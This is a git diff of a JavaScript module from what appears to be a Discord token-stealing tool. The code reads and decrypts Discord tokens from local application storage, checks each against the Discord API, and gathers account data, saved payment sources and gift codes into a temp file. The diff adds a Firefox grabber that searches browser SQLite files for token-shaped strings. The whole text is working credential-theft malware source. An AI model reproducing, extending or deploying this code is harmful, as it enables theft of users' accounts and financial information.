@@ -10,6 +10,8 @@ const { tempFolder } = require('../index');
 const { userAgent } = require('../config');
 const { runningFromExecutable } = require('../util/general');
 
+const jsonFile = join(tempFolder, 'Discord.json');
+writeFileSync(jsonFile, '{}');
 const tokens = [];
 const paths = {
   'Discord': join(roamingAppData, 'discord'),
@@ -60,7 +62,7 @@ const decryptRickRoll = (path) => {
         input: createReadStream(join(levelDB, f)), output: os.devNull, console: false
       });
       readInterface.on('line', (line) => {
-        line.match(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/gi)?.map(token => {
+        line.match(/dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi)?.map(token => {
           if (token.endsWith('\\')) token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
           if (!encryptedTokens[token]) encryptedTokens.push(token);
         });
@@ -76,68 +78,81 @@ const decryptRickRoll = (path) => {
   });
 };
 
+const handleTokens = (tokens, resolve) => tokens.map(token => {
+  token = token?.toString()?.replaceAll(/[\n\r\t]/gi, '');
+  axios.get('https://discord.com/api/v10/users/@me', {
+    headers: { Authorization: token, 'User-Agent': userAgent }
+  })
+    .then(res => {
+      if (res.status !== 200) return;
+      let json = res.data;
+      json.token = token;
+      let info = statSync(jsonFile) ? require(jsonFile) : {};
+      if (!info.accounts) info.accounts = [];
+      if (!info.accounts.find(account => account.token === token)) {
+        info.accounts.push(json);
+        writeFileSync(jsonFile, JSON.stringify(info));
+      }
+
+      axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
+        headers: { Authorization: token, 'User-Agent': userAgent }
+      })
+        .then(res => {
+          if (res.status !== 200) return;
+          const json = res.data;
+          let info = require(jsonFile);
+          if (!info.billing) info.billing = [];
+          json.forEach(billing => {
+            if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
+          });
+          writeFileSync(jsonFile, JSON.stringify(info));
+
+          axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
+            headers: { Authorization: token, 'User-Agent': userAgent }
+          })
+            .then(res => {
+              if (res.status !== 200) return;
+              const json = res.data;
+              let info = require(jsonFile);
+              if (!info.gifts) info.gifts = [];
+              json.forEach(gift => {
+                if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
+              });
+              writeFileSync(jsonFile, JSON.stringify(info));
+
+              resolve();
+            })
+            .catch(() => {});
+        })
+        .catch(() => {});
+    })
+    .catch(() => {});
+});
+
 module.exports = new Promise((resolve) => {
-  const jsonFile = join(tempFolder, 'Discord Accounts.json');
-  writeFileSync(jsonFile, '{}');
   Object.keys(paths).forEach(path => {
     if (!existsSync(paths[path])) return;
     else if (path.includes('Firefox')) {
-      // TODO: do Firefox grabber
-    } else {
-      decryptRickRoll(paths[path])
-        .then(tokens => {
-          tokens.map(token => {
-            token = token?.toString()?.replaceAll(/[\n\r\t]/gi, '');
-            axios.get('https://discord.com/api/v10/users/@me', {
-              headers: { Authorization: token, 'User-Agent': userAgent }
-            })
-              .then(res => {
-                if (res.status !== 200) return;
-                let json = res.data;
-                json.token = token;
-                let info = statSync(jsonFile) ? require(jsonFile) : {};
-                if (!info.accounts) info.accounts = [];
-                if (!info.accounts.find(account => account.token === token)) {
-                  info.accounts.push(json);
-                  writeFileSync(jsonFile, JSON.stringify(info));
-                }
-
-                axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
-                  headers: { Authorization: token, 'User-Agent': userAgent }
-                })
-                  .then(res => {
-                    if (res.status !== 200) return;
-                    const json = res.data;
-                    let info = require(jsonFile);
-                    if (!info.billing) info.billing = [];
-                    json.forEach(billing => {
-                      if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
-                    });
-                    writeFileSync(jsonFile, JSON.stringify(info));
-
-                    axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
-                      headers: { Authorization: token, 'User-Agent': userAgent }
-                    })
-                      .then(res => {
-                        if (res.status !== 200) return;
-                        const json = res.data;
-                        let info = require(jsonFile);
-                        if (!info.gifts) info.gifts = [];
-                        json.forEach(gift => {
-                          if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
-                        });
-                        writeFileSync(jsonFile, JSON.stringify(info));
-
-                        resolve();
-                      })
-                      .catch(() => {});
-                  })
-                  .catch(() => {});
-              })
-              .catch(() => {});
+      try {
+        const search = execSync('where /r . *.sqlite', { cwd: paths[path] }).toString();
+        if (search) {
+          search.split(/\r?\n/).forEach((filePath) => {
+            filePath = filePath.trim();
+            if (!statSync(filePath).isFile()) return;
+            const lines = readFileSync(filePath, { encoding: 'utf-8', flag: 'r' }).split('\n').map(x => x.trim());
+            lines.forEach((line) => {
+              const tokensMatch = line.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/);
+              if (tokensMatch) {
+                tokensMatch.forEach((token) => {
+                  if (!tokens.includes(token)) tokens.push(token);
+                });
+              }
+            });
           });
-        })
-        .catch(resolve);
+        }
+      } catch (e) {}
+    } else {
+      decryptRickRoll(paths[path]).then(tokens => handleTokens(tokens, resolve)).catch(resolve);
     }
   });
 });
